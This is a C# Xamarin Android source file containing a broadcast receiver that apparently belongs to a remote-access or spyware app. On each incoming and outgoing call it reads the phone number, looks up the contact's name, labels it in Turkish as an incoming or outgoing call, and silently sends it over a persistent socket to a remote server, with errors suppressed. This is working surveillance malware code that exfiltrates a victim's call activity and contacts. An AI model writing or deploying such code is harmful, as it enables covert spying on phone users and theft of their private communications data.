using Android.App;
using Android.Content;
using Android.Telephony;
using System;
using System.Net.Sockets;

namespace Task2
{
    [BroadcastReceiver]
    [IntentFilter(new[] { TelephonyManager.ActionPhoneStateChanged, Intent.ActionNewOutgoingCall })]
    public class PhonecallReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {          
            if (intent.Action == TelephonyManager.ActionPhoneStateChanged)
            {
                string state = intent.GetStringExtra(TelephonyManager.ExtraState);
                if (state == TelephonyManager.ExtraStateRinging)
                {
                    var number = intent.GetStringExtra(TelephonyManager.ExtraIncomingNumber);
                    if (!string.IsNullOrEmpty(number))
                    {
                        try
                        {
                            byte[] dataPacker = ForegroundService._globalService.MyDataPacker("ARAMA", System.Text.Encoding.UTF8.GetBytes("Gelen Arama" + "=" +
                          ForegroundService._globalService.telefondanIsim(number) + "/" + number + "="));
                            ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                        }
                        catch (Exception) { }

                    }
                }
            }
            if (intent.Action.Contains(Intent.ActionNewOutgoingCall))
            {
                var number = intent.GetStringExtra(Intent.ExtraPhoneNumber);
                if (!string.IsNullOrEmpty(number))
                {
                    try
                    {
                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("ARAMA", System.Text.Encoding.UTF8.GetBytes("Giden Arama" + "=" +
                                ForegroundService._globalService.telefondanIsim(number) + "/" + number + "="));
                        ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }

        }
    }
}